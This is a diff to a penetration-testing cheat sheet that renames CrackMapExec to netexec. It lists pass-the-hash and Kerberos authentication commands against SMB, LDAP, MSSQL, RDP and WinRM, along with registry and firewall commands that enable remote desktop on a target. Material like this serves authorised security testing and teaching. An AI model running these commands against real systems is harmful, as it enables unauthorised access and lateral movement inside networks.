@@ -7,7 +7,7 @@
     * [Guest Credential](#guest-credential)
     * [Retail Credential](#retail-credential)
     * [Sandbox Credential](#sandbox-credential)
-* [Crackmapexec](#crackmapexec)
+* [netexec](#netexec)
 * [Impacket](#impacket)
     * [PSExec](#psexec)
     * [WMIExec](#wmiexec)
@@ -94,23 +94,23 @@ Username: wdagutilityaccount
 Password: pw123
 ```
 
-## Crackmapexec
+## netexec
 
-Using [mpgn/CrackMapExec](https://github.com/mpgn/CrackMapExec)
+Using [mpgn/netexec](https://github.com/Pennyw0rth/NetExec)
 
-* CrackMapExec supports many protocols
+* netexec supports many protocols
     ```powershell
-    crackmapexec ldap 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0" 
-    crackmapexec mssql 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0"
-    crackmapexec rdp 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0" 
-    crackmapexec smb 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0"
-    crackmapexec winrm 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0"
+    netexec ldap 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0" 
+    netexec mssql 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0"
+    netexec rdp 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0" 
+    netexec smb 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0"
+    netexec winrm 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0"
     ```
-* CrackMapExec works with password, NT hash and Kerberos authentication
+* netexec works with password, NT hash and Kerberos authentication
     ```powershell
-    crackmapexec smb 192.168.1.100 -u Administrator -p "Password123?" # Password
-    crackmapexec smb 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0" # NT Hash
-    export KRB5CCNAME=/tmp/kerberos/admin.ccache; crackmapexec smb 192.168.1.100 -u admin --use-kcache # Kerberos
+    netexec smb 192.168.1.100 -u Administrator -p "Password123?" # Password
+    netexec smb 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0" # NT Hash
+    export KRB5CCNAME=/tmp/kerberos/admin.ccache; netexec smb 192.168.1.100 -u admin --use-kcache # Kerberos
     ```
 
 
@@ -228,7 +228,7 @@ PS C:\> netsh firewall set service remoteadmin enable
 PS C:\> netsh firewall set service remotedesktop enable
 # Alternative
 C:\> psexec \\machinename reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0
-root@payload$ crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable
+root@payload$ netexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable
 
 # Fix CredSSP errors
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
